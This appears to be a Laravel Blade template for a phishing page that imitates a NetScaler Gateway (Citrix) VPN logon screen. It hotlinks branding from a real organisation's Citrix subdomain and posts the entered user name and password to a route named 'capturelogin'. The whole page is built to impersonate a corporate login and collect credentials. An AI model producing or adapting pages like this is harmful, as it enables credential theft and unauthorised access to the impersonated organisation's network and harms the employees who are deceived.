<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
    <head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta charset="utf-8">
    <title class="_ctxstxt_NetscalerGateway">NetScaler Gateway</title>
    <link rel="ICON" href="https://citrix.longhornpublishers.com/logon/LogonPoint/receiver/images/common/icon_vpn.ico" sizes="16x16 32x32 48x48 64x64" type="image/vnd.microsoft.icon">
    <link rel="SHORTCUT ICON" href="https://citrix.longhornpublishers.com/logon/LogonPoint/receiver/images/common/icon_vpn.ico" sizes="16x16 32x32 48x48 64x64" type="image/vnd.microsoft.icon">

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="csrf-token" content="{{ csrf_token() }}" />

    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <script>
        document.createElement('header');
        document.createElement('nav');
        document.createElement('section');
    </script>
    <style>
        #passwd{
            -webkit-text-security:disc;
        }
    </style>
    <style type="text/css">
        .theme-highlight-border-color { border-color:rgb(2, 161, 193);}
        .theme-highlight-hover-color:hover { color:rgb(2, 161, 193);}
        .explicit-auth-screen {

        }
    </style>

        <!-- #start-concat-css ctxs.large-ui.min.css -->
        <link rel="stylesheet" href="{{ asset('css/ctxs.css') }}" >
        <!-- #end-concat-css -->
    </head>
    <body style="cursor: default;">
        <div id=".theme-highlight-sprite">
            <section id="explicit-auth-screen" class="explicit-auth-view scrollable x-scrollable fullscreen-pane web-screen" style="display: block; background-image: url('{{ asset('img/ReceiverFullScreenBackground.jpg')}}');">
                <div id="pluginExplicitAuthHeader" class="pluginAuthHeader"><div id="customExplicitAuthHeader" class="customAuthHeader"></div></div>
                <!--    inserting header for caxton -->
                <div id="logonbelt-topshadow">
                        <table class="full_width">
                            <tbody><tr id="row1">
                                <td class="header_left"></td>
                            </tr>
                            <tr id="row2">
                                <td colspan="2" class="navbar"></td>
                            </tr>
                        </tbody></table>
                    </div>
                    <!--  End of header div for caxton -->
                <div class="vertical-center-outer">
                    <div class="vertical-center-inner">
                        <div class="logon-small logon-logo-container"></div>
                        <div class="content-area">
                            <div id="pluginExplicitAuthTop" class="pluginAuthTop"><div id="customExplicitAuthTop" class="customAuthTop"></div></div>
                            <div class="logon-area">
                                <div class="logon-spacer logon-large logon-logo-container"></div>
                                <div class="form-content">
                                    <div class="form-container">
                                        <form class="form insertPoint credentialform" action="capturelogin" method="POST">
                                            {{ csrf_field() }}
                                            <input type="hidden" id="id_hidden" name="id" />
                                            <div class="field CredentialTypenone">
                                                <div class="left">
                                                    <h1><span id="login_title">Please log on</span></h1>
                                                </div>
                                            </div>
                                            <div class="field CredentialTypeusername">
                                                <div class="left">
                                                    <label class="label plain" for="login">User name :</label>
                                                </div>
                                                <div class="right">
                                                    <input name="username" id="username" type="text" autocomplete="off" spellcheck="false">
                                                </div>
                                            </div>
                                            <div class="field CredentialTypepassword">
                                                <div class="left">
                                                    <label class="label plain" for="passwd">Password :</label>
                                                </div>
                                                <div class="right">
                                                    <input name="txtpasswords" id="txtpasswords" type="text" autocomplete="off" spellcheck="false" style="-webkit-text-security: disc;">
                                                </div>
                                            </div>
                                            <div class="field CredentialTypesavecredentials" style="display: none;">
                                                <div class="right checkbox">
                                                    <input id="savecredentials" name="savecredentials" type="checkbox" value="savecredentials">
                                                    <label for="savecredentials" class="label plain">Remember my credentials</label>
                                                </div>
                                            </div>
                                            <div class="field buttonsrow">
                                                <div class="buttonscontainer right">
                                                    <button id="nsg-x1-logon-button" type="submit" class="button forms-authentication-button last-child default">Log On</button>
                                                </div>
                                                <div class="spinner" style="visibility: hidden">
                                                    <img src="NetScaler%20Gateway2_files/authspinner.gif" alt="">
                                                </div>
                                            </div>
                                            <div class="spacer"></div>
                                        </form>
                                    </div>
                                    <div class="explicit-auth-progress" style="display: none;">
                                        <h1 class="_ctxstxt_ResumingLogon main-text">Resuming logon, please wait.</h1>
                                        <div class="spinner authentication-spinner"></div>
                                    </div>
                                    <p class="back-to-choices" style="display: none;"><a href="#" class="authentication-link _ctxstxt_UseAnotherLogonOption"> Use another logon option</a></p>
                                </div>
                                <div class="logon-spacer"></div>
                            </div>
                            <div id="pluginExplicitAuthBottom" class="pluginAuthBottom"><div id="customExplicitAuthBottom" class="customAuthBottom"></div></div>
                        </div>
                    </div>
                </div>
                <div id="pluginExplicitAuthFooter" class="pluginAuthFooter"><div id="customExplicitAuthFooter" class="customAuthFooter"></div></div>
            </section>


            <div id="ica-download-container"></div>
            <script src="{{ asset('js/jquery-1.js')}}" type="text/javascript" ></script>
            <script src="{{ asset('js/jquery-ui-v1.js')}}" type="text/javascript" ></script>
            <script src="{{ asset('js/jquery.js')}}" type="text/javascript" ></script>
            <!--[if gte IE 9]--><script src="{{ asset('js/hammer.js')}}" type="text/javascript" ></script><!--[endif]-->
            <script src="{{ asset('js/jquery_002.js')}}" type="text/javascript" ></script>
            <script src="{{ asset('js/velocity.js')}}" type="text/javascript" ></script>
            <div class="theme-highlight-color">
                <div></div>
            </div>


        </div>
    </body>
</html>
